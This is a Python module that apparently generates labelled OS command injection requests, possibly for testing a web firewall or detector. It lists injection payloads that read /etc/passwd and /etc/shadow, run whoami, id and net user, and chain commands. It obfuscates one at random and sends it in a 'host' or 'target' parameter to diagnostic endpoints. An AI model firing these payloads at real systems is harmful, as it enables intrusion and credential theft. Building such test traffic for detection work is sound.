import random
from typing import Dict, Tuple
from .base import BaseAttack
from ..utils.obfuscator import Obfuscator

class CMDIAttack(BaseAttack):
    PAYLOADS = [
        "; cat /etc/passwd",
        "| whoami",
        "& id",
        "`id`",
        "$(cat /etc/passwd)",
        "; ls -la /",
        "| uname -a",
        "& net user",
        "; ping -c 4 127.0.0.1",
        "|| cat /etc/shadow"
    ]

    ENDPOINTS = [
        "/ping",
        "/lookup",
        "/api/diagnostic",
        "/tools/nslookup"
    ]

    def generate(self, base_url: str) -> Tuple[Dict, Dict]:
        """
        Generates an OS Command Injection attack configuration.
        Returns: (request_kwargs, answer_key_metadata)
        """
        payload = Obfuscator.obfuscate(random.choice(self.PAYLOADS), self.obfuscation_level)
        endpoint = random.choice(self.ENDPOINTS)
        url = f"{base_url}{endpoint}"
        
        # Command injection payloads are often via GET or POST
        method = random.choice(["GET", "POST"])
        
        request_kwargs = {
            "method": method,
            "url": url,
        }
        
        if method == "POST":
            request_kwargs["data"] = {"host": payload}
        else:
            request_kwargs["params"] = {"target": payload}

        metadata = {
            "type": "CMDI",
            "endpoint": endpoint,
            "payload": payload,
            "method": method
        }
        
        return request_kwargs, metadata
